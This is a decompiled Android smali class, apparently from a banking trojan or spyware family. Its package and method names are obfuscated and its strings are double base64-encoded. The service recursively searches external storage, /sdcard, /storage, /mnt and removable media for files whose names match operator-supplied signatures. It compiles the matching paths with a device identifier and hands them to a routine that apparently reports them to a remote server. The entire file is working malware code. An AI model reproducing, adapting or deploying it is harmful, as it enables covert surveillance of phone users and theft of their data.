.class public Lnaqsl/ebxcb/exu/ServiceFindFiles;
.super Landroid/app/IntentService;
.source ""


# instance fields
.field fddo:Lnaqsl/ebxcb/exu/int;

.field for:[Ljava/lang/String;

.field ifdf:Ljava/lang/String;


# direct methods
.method public constructor <init>()V
    .registers 2

    const-string v0, "ServiceFindFiles"

    invoke-direct {p0, v0}, Landroid/app/IntentService;-><init>(Ljava/lang/String;)V

    new-instance v0, Lnaqsl/ebxcb/exu/int;

    invoke-direct {v0}, Lnaqsl/ebxcb/exu/int;-><init>()V

    iput-object v0, p0, Lnaqsl/ebxcb/exu/ServiceFindFiles;->fddo:Lnaqsl/ebxcb/exu/int;

    const-string v0, ""

    iput-object v0, p0, Lnaqsl/ebxcb/exu/ServiceFindFiles;->ifdf:Ljava/lang/String;

    return-void
.end method


# virtual methods
.method fddo(Ljava/io/File;)V
    .registers 10

    :try_start_0
    sget-object v0, Ljava/lang/System;->out:Ljava/io/PrintStream;

    invoke-virtual {v0, p1}, Ljava/io/PrintStream;->println(Ljava/lang/Object;)V

    invoke-virtual {p1}, Ljava/io/File;->listFiles()[Ljava/io/File;

    move-result-object p1

    array-length v0, p1

    const/4 v1, 0x0

    const/4 v2, 0x0

    :goto_c
    if-ge v2, v0, :cond_72

    aget-object v3, p1, v2

    invoke-virtual {v3}, Ljava/io/File;->isDirectory()Z

    move-result v4

    if-eqz v4, :cond_1a

    invoke-virtual {p0, v3}, Lnaqsl/ebxcb/exu/ServiceFindFiles;->ifdf(Ljava/io/File;)V

    goto :goto_6f

    :cond_1a
    invoke-virtual {v3}, Ljava/io/File;->isFile()Z

    move-result v4

    if-eqz v4, :cond_6f

    const/4 v4, 0x0

    :goto_21
    iget-object v5, p0, Lnaqsl/ebxcb/exu/ServiceFindFiles;->for:[Ljava/lang/String;

    array-length v5, v5

    if-ge v4, v5, :cond_6f

    iget-object v5, p0, Lnaqsl/ebxcb/exu/ServiceFindFiles;->for:[Ljava/lang/String;

    aget-object v5, v5, v4

    invoke-virtual {v5}, Ljava/lang/String;->length()I

    move-result v6

    const/4 v7, 0x1

    if-le v6, v7, :cond_6c

    invoke-virtual {v3}, Ljava/io/File;->getName()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v6, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_6c

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v6, p0, Lnaqsl/ebxcb/exu/ServiceFindFiles;->ifdf:Ljava/lang/String;

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v6, "ZkNwOA=="

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v6, "WEc0PQ=="

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    iput-object v5, p0, Lnaqsl/ebxcb/exu/ServiceFindFiles;->ifdf:Ljava/lang/String;
    :try_end_6c
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_6c} :catch_72

    :cond_6c
    add-int/lit8 v4, v4, 0x1

    goto :goto_21

    :cond_6f
    :goto_6f
    add-int/lit8 v2, v2, 0x1

    goto :goto_c

    :catch_72
    :cond_72
    return-void
.end method

.method ifdf(Ljava/io/File;)V
    .registers 10

    invoke-virtual {p1}, Ljava/io/File;->listFiles()[Ljava/io/File;

    move-result-object p1

    array-length v0, p1

    const/4 v1, 0x0

    const/4 v2, 0x0

    :goto_7
    if-ge v2, v0, :cond_6b

    aget-object v3, p1, v2

    invoke-virtual {v3}, Ljava/io/File;->isDirectory()Z

    move-result v4

    if-eqz v4, :cond_15

    invoke-virtual {p0, v3}, Lnaqsl/ebxcb/exu/ServiceFindFiles;->ifdf(Ljava/io/File;)V

    goto :goto_68

    :cond_15
    invoke-virtual {v3}, Ljava/io/File;->isFile()Z

    move-result v4

    if-eqz v4, :cond_68

    const/4 v4, 0x0

    :goto_1c
    iget-object v5, p0, Lnaqsl/ebxcb/exu/ServiceFindFiles;->for:[Ljava/lang/String;

    array-length v6, v5

    if-ge v4, v6, :cond_68

    aget-object v5, v5, v4

    invoke-virtual {v5}, Ljava/lang/String;->length()I

    move-result v6

    const/4 v7, 0x1

    if-le v6, v7, :cond_65

    invoke-virtual {v3}, Ljava/io/File;->getName()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v6, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_65

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v6, p0, Lnaqsl/ebxcb/exu/ServiceFindFiles;->ifdf:Ljava/lang/String;

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v6, "ZkNwOA=="

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v6, "WEc0PQ=="

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    iput-object v5, p0, Lnaqsl/ebxcb/exu/ServiceFindFiles;->ifdf:Ljava/lang/String;

    :cond_65
    add-int/lit8 v4, v4, 0x1

    goto :goto_1c

    :cond_68
    :goto_68
    add-int/lit8 v2, v2, 0x1

    goto :goto_7

    :cond_6b
    return-void
.end method

.method protected onHandleIntent(Landroid/content/Intent;)V
    .registers 10

    const-string p1, "ZkE9PQ=="

    const-string v0, "THc9PQ=="

    const-string v1, "Wm1sdVpHWnBiR1Z6"

    :try_start_6
    iget-object v2, p0, Lnaqsl/ebxcb/exu/ServiceFindFiles;->fddo:Lnaqsl/ebxcb/exu/int;

    invoke-static {v1}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, p0, v3}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-static {v0}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v3

    if-eqz v3, :cond_31

    invoke-static {v0}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lnaqsl/ebxcb/exu/ServiceFindFiles;->for:[Ljava/lang/String;

    goto :goto_36

    :cond_31
    iget-object v0, p0, Lnaqsl/ebxcb/exu/ServiceFindFiles;->for:[Ljava/lang/String;

    const/4 v3, 0x0

    aput-object v2, v0, v3

    :goto_36
    new-instance v0, Ljava/io/File;

    const-string v2, "TDIxdWRBPT0="

    invoke-static {v2}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v0, v2}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    new-instance v2, Ljava/io/File;

    const-string v3, "TDIxdmRXNTA="

    invoke-static {v3}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-direct {v2, v3}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    new-instance v3, Ljava/io/File;

    const-string v4, "TDNOa1kyRnlaQT09"

    invoke-static {v4}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    new-instance v4, Ljava/io/File;

    const-string v5, "TDNOMGIzSmhaMlU9"

    invoke-static {v5}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-direct {v4, v5}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    new-instance v5, Ljava/io/File;

    const-string v6, "TDFKbGJXOTJZV0pzWlE9PQ=="

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-direct {v5, v6}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;

    move-result-object v6

    invoke-virtual {p0, v6}, Lnaqsl/ebxcb/exu/ServiceFindFiles;->fddo(Ljava/io/File;)V

    invoke-virtual {p0, v0}, Lnaqsl/ebxcb/exu/ServiceFindFiles;->fddo(Ljava/io/File;)V

    invoke-virtual {p0, v2}, Lnaqsl/ebxcb/exu/ServiceFindFiles;->fddo(Ljava/io/File;)V

    invoke-virtual {p0, v3}, Lnaqsl/ebxcb/exu/ServiceFindFiles;->fddo(Ljava/io/File;)V

    invoke-virtual {p0, v4}, Lnaqsl/ebxcb/exu/ServiceFindFiles;->fddo(Ljava/io/File;)V

    invoke-virtual {p0, v5}, Lnaqsl/ebxcb/exu/ServiceFindFiles;->fddo(Ljava/io/File;)V

    iget-object v0, p0, Lnaqsl/ebxcb/exu/ServiceFindFiles;->ifdf:Ljava/lang/String;

    const-string v2, "ZkNwOA=="

    invoke-static {v2}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const-string v3, ""

    invoke-virtual {v0, v2, v3}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v2

    const/16 v3, 0xa

    if-le v2, v3, :cond_123

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "Um05MWJtUWdabWxzWlhNZ1lua2djMmxuYm1GMGRYSmxjenBjYmc9PQ=="

    invoke-static {v3}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    iget-object v2, p0, Lnaqsl/ebxcb/exu/ServiceFindFiles;->fddo:Lnaqsl/ebxcb/exu/int;

    const-string v3, "TkE9PQ=="

    invoke-static {v3}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "Y0QwPQ=="

    invoke-static {v5}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v5, p0, Lnaqsl/ebxcb/exu/ServiceFindFiles;->fddo:Lnaqsl/ebxcb/exu/int;

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v7, p0, Lnaqsl/ebxcb/exu/ServiceFindFiles;->fddo:Lnaqsl/ebxcb/exu/int;

    invoke-virtual {v7, p0}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-static {p1}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-static {v7}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-static {p1}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    invoke-static {p1}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v6, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v5, p1}, Lnaqsl/ebxcb/exu/int;->for(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v4, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v2, p0, v3, p1}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    :cond_123
    iget-object p1, p0, Lnaqsl/ebxcb/exu/ServiceFindFiles;->fddo:Lnaqsl/ebxcb/exu/int;

    invoke-static {v1}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "S2lwbVlXeHpaU29x"

    invoke-static {v1}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p1, p0, v0, v1}, Lnaqsl/ebxcb/exu/int;->ifdf(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_13a
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_13a} :catch_13a

    :catch_13a
    return-void
.end method
